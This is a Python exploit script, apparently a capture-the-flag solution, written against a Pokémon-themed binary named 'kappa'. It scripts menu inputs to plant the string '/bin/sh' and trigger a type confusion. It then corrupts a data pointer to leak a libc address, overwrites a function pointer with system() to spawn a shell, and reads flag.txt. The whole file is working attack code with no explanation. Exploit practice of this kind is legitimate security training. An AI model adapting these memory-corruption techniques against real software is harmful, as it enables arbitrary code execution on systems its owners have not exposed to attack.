#!/usr/bin/env python
from pwnapi import *

log.level      = 2
libc           = ELF("/usr/lib32/libc.so.6")
context.binary = ELF("./kappa")
p              = context.getprocess()

log.info("filling all available slots")
for i in range(4):
	p.sendlineafter(b"\n\n", b"1")
	p.sendlineafter(b"\n\n", b"1")
	p.sendlineafter(b"Run\n", b"2")
	p.sendlineafter(b"?\n", b"name")

log.info("searching a Charizard")
for i in range(2):
	p.sendlineafter(b"\n\n", b"1")
	p.sendlineafter(b"\n\n", b"1")
	p.sendlineafter(b"Run\n", b"3")
p.sendlineafter(b"\n\n", b"1")

log.info("catching Charizard")
for i in range(4):
	p.sendlineafter(b"Run\n", b"1")
p.sendlineafter(b"Run\n", b"2")
p.sendlineafter(b"?\n", b"/bin/sh")

log.info("getting type confusion")
p.sendlineafter(b"\n\n", b"5")

log.info("corrupting data pointer")
p.sendlineafter(b"\n\n", b"5")
p.sendlineafter(b"/bin/sh\n\n", b"5")
p.send(fit({509: p32(context.binary.sym.plt.read+2), 513:p32(0x8048766), 3999:b"\n"}))

log.info("leaking libc address")
p.sendlineafter(b"\n\n", b"3")
leak      = u32(p.recvuntil(b"Choose").split(b"Attack: ")[-1][:4])
libc.base = leak-libc.sym.read

log.info("corrupting function pointer")
p.sendlineafter(b"\n\n", b"5")
p.sendlineafter(b"/bin/sh\n\n", b"5")
p.send(fit({513:p32(libc.sym.system), 3999:b"\n"}))

log.info("getting code execution")
p.sendlineafter(b"\n\n", b"3")

p.sendline(b"cat flag.txt; exit")
l    = p.recvuntil(b"Choose")
flag = l[l.find(b"{"):].split(b"\n")[0]
log.info("flag: {}".format(flag.decode("utf-8")))

p.close()
